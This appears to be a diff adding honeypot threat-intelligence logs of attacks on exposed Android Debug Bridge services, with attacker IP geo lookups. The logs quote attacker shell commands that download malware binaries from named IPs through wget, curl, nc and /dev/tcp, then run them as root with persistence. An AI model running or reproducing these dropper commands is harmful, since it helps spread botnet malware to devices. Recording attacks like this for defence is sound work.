@@ -1,0 +1,65 @@
+ABD Exploit Attack (MANTIS Honeypot //Threat Intelligence)
+
+
+{
+  "stage": "connect",
+  "client_command": "0x4e584e43",
+  "client_banner": "host::features=cmd,shell_v2",
+  "banner_parsed": {
+    "raw": "host::features=cmd,shell_v2",
+    "type": "host",
+    "features": [
+      "cmd",
+      "shell_v2"
+    ]
+  }
+}
+
+
+{
+  "command": "cd /data/local/tmp/; busybox wget http://130.12.180.124/rq0anbhkd976/assets/js/o5a0j5tug8?token=PeOtaCY5NmzmOSDVm0BX9UDM8lJijstK; chmod 777 o5a0j5tug8; ./o5a0j5tug8",
+  "mode": "exec"
+}
+
+
+Source/Attacker IP: 176.55.139.38
+
+Geo Lookup: 176.65.139.38
+×
+IP	176.65.139.38
+Country	United Kingdom
+City	Hugh Town
+ISP	ZeXoTeK IT-Services GmbH
+Lat/Lon	49.9148, -6.31113
+
+{
+  "command": "cd /data/local/tmp/; wget http://130.12.180.78/manji.arm7 -O manji.arm7 || busybox wget http://130.12.180.78/manji.arm7 -O manji.arm7; chmod 777 manji.arm7; ./manji.arm7 || wget http://130.12.180.78/manji.mips -O manji.mips || busybox wget http://130.12.180.78/manji.mips -O manji.mips; chmod 777 manji.mips; ./manji.mips",
+  "mode": "exec"
+}
+
+{
+  "stage": "connect",
+  "client_command": "0x4e584e43",
+  "client_banner": "host::features=cmd,shell_v2"
+}
+
+
+
+Geo Lookup: 204.76.203.8
+×
+IP	204.76.203.8
+Country	Netherlands
+City	Eygelshoven
+ISP	Pfcloud UG
+Lat/Lon	50.8897, 6.0563
+
+{
+  "stage": "connect",
+  "client_command": "0x4e584e43",
+  "client_banner": "host::features=cmd,shell_v2"
+}
+
+{
+  "command": "cd /data/local/tmp 2>/dev/null || cd /tmp 2>/dev/null || cd /cache; rm -f parm7 parm5 parm6 parm; mkdir -p /data/local/tmp 2>/dev/null; (wget -q -O parm7 http://45.148.120.23/bins/parm7 2>/dev/null || busybox wget -q -O parm7 http://45.148.120.23/bins/parm7 2>/dev/null || curl -fsSL -o parm7 http://45.148.120.23/bins/parm7 2>/dev/null || nc 45.148.120.23 3338 > parm7 2>/dev/null || toybox nc 45.148.120.23 3338 > parm7 2>/dev/null || bash -c \"cat < /dev/tcp/45.148.120.23/3338 > parm7\" 2>/dev/null || dd if=/dev/tcp/45.148.120.23/3338 of=parm7 2>/dev/null); (wget -q -O parm5 http://45.148.120.23/bins/parm5 2>/dev/null || busybox wget -q -O parm5 http://45.148.120.23/bins/parm5 2>/dev/null || curl -fsSL -o parm5 http://45.148.120.23/bins/parm5 2>/dev/null || nc 45.148.120.23 3336 > parm5 2>/dev/null || toybox nc 45.148.120.23 3336 > parm5 2>/dev/null || bash -c \"cat < /dev/tcp/45.148.120.23/3336 > parm5\" 2>/dev/null || dd if=/dev/tcp/45.148.120.23/3336 of=parm5 2>/dev/null); (wget -q -O parm6 http://45.148.120.23/bins/parm6 2>/dev/null || busybox wget -q -O parm6 http://45.148.120.23/bins/parm6 2>/dev/null || curl -fsSL -o parm6 http://45.148.120.23/bins/parm6 2>/dev/null || nc 45.148.120.23 3337 > parm6 2>/dev/null || toybox nc 45.148.120.23 3337 > parm6 2>/dev/null || bash -c \"cat < /dev/tcp/45.148.120.23/3337 > parm6\" 2>/dev/null || dd if=/dev/tcp/45.148.120.23/3337 of=parm6 2>/dev/null); (wget -q -O parm http://45.148.120.23/bins/parm 2>/dev/null || busybox wget -q -O parm http://45.148.120.23/bins/parm 2>/dev/null || curl -fsSL -o parm http://45.148.120.23/bins/parm 2>/dev/null || nc 45.148.120.23 3335 > parm 2>/dev/null || toybox nc 45.148.120.23 3335 > parm 2>/dev/null || bash -c \"cat < /dev/tcp/45.148.120.23/3335 > parm\" 2>/dev/null || dd if=/dev/tcp/45.148.120.23/3335 of=parm 2>/dev/null); [ -f parm7 ] && (chmod 777 parm7 2>/dev/null || chmod +x parm7 2>/dev/null); [ -f parm5 ] && (chmod 777 parm5 2>/dev/null || chmod +x parm5 2>/dev/null); [ -f parm6 ] && (chmod 777 parm6 2>/dev/null || chmod +x parm6 2>/dev/null); [ -f parm ] && (chmod 777 parm 2>/dev/null || chmod +x parm 2>/dev/null); [ -f parm7 ] && (su -c 'nohup /data/local/tmp/parm7 arm7 >/dev/null 2>&1 &' 2>/dev/null || su root -c 'nohup /data/local/tmp/parm7 arm7 >/dev/null 2>&1 &' 2>/dev/null || nohup ./parm7 arm7 >/dev/null 2>&1 &); [ -f parm5 ] && (su -c 'nohup /data/local/tmp/parm5 >/dev/null 2>&1 &' 2>/dev/null || su root -c 'nohup /data/local/tmp/parm5 >/dev/null 2>&1 &' 2>/dev/null || nohup ./parm5 >/dev/null 2>&1 &); [ -f parm6 ] && (su -c 'nohup /data/local/tmp/parm6 >/dev/null 2>&1 &' 2>/dev/null || su root -c 'nohup /data/local/tmp/parm6 >/dev/null 2>&1 &' 2>/dev/null || nohup ./parm6 >/dev/null 2>&1 &); [ -f parm ] && (su -c 'nohup /data/local/tmp/parm >/dev/null 2>&1 &' 2>/dev/null || su root -c 'nohup /data/local/tmp/parm >/dev/null 2>&1 &' 2>/dev/null || nohup ./parm >/dev/null 2>&1 &); [ -f parm7 ] && (su -c '/data/local/tmp/parm7 arm5 >/dev/null 2>&1 &' 2>/dev/null || su root -c '/data/local/tmp/parm7 arm5 >/dev/null 2>&1 &' 2>/dev/null || ./parm7 arm5 >/dev/null 2>&1 &) || [ -f parm5 ] && (su -c '/data/local/tmp/parm5 arm5 >/dev/null 2>&1 &' 2>/dev/null || su root -c '/data/local/tmp/parm5 arm5 >/dev/null 2>&1 &' 2>/dev/null || ./parm5 arm5 >/dev/null 2>&1 &) || [ -f parm6 ] && (su -c '/data/local/tmp/parm6 arm5 >/dev/null 2>&1 &' 2>/dev/null || su root -c '/data/local/tmp/parm6 arm5 >/dev/null 2>&1 &' 2>/dev/null || ./parm6 arm5 >/dev/null 2>&1 &) || [ -f parm ] && (su -c '/data/local/tmp/parm arm5 >/dev/null 2>&1 &' 2>/dev/null || su root -c '/data/local/tmp/parm arm5 >/dev/null 2>&1 &' 2>/dev/null || ./parm arm5 >/dev/null 2>&1 &)",
+  "mode": "exec"
+}
